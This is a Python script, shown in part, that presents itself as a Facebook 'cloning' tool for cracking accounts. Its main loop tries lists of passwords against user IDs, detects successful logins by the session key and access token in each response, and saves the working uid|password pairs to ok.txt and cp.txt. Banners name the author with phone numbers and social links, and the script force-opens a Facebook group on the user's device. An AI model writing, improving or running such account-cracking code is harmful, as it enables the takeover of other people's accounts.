...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝘼𝙒𝘼𝙄𝙎 𝙆𝙃𝘼𝙉\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Contact :+8801712034653\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : 𝘼𝙒𝘼𝙄𝙎 𝙆𝙃𝘼𝙉 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : +923452532977
\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : 𝘼𝙒𝘼𝙄𝙎 𝙆𝙃𝘼𝙉
Alamgir.441 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	exit(" [=>] FACEBOOK :  https://www.facebook.com/tere.baap.ka.link.hain.kya")
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/groups/4588853504472888/?ref=share_group_link")
	subprocess.check_output(["am", "start", "https://www.facebook.com/groups/4588853504472888/?ref=share_group_link"])
...
class Main:
 ...
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m 𝘼𝙒𝘼𝙄𝙎 𝙆𝙃𝘼𝙉\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Contact : +923452532977\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : 𝙰𝚆𝙰𝙸𝚂 𝙺𝙷𝙰𝙽 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m yt.      : TECHNICAL AWAIS \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/tere.baap.ka.link.hain.kya\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %s2003TO2009 CLONING TOOLS"%(G,R,G,B,G))
		print("%s [%s•%s] %sContack   : %s+923452532977"%(G,R,G,B,G))
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/groups/4588853504472888/?ref=share_group_link"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2003-11 {JUST NOW} %s(PREMIUM)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [AWAIS=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [AWAIS=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [AWAIS=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [AWAIS=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
 
 #Alam-Priya copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      : ALONE 🙂 \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/tere.baap.ka.link.hain.kya ")
		print(" [*] POHTON : MOMANDIANS ")
		print(" [*] YouTube   : https://youtube.com/channel/UCXdYPUUNiA6HtutWKd07XMA ")
		exit(" [*] GitHub    : https://github.com/awaismoman ")
	else:
